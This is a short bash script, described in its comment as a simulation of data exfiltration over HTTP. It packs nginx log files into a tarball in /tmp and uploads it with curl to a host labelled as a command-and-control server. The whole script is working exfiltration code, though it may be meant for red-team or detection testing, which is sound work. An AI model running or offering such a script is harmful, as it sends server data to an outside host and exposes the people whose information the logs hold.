#!/bin/bash
# Simulates exfiltration of sensitive data via HTTP
TARGET_C2="http://192.168.1.100/incoming"
echo "[!] Compressing logs for exfiltration..."
tar -czf /tmp/exfil.tar.gz /var/log/nginx/*.log
echo "[!] Sending data to C2..."
curl -F "file=@/tmp/exfil.tar.gz" $TARGET_C2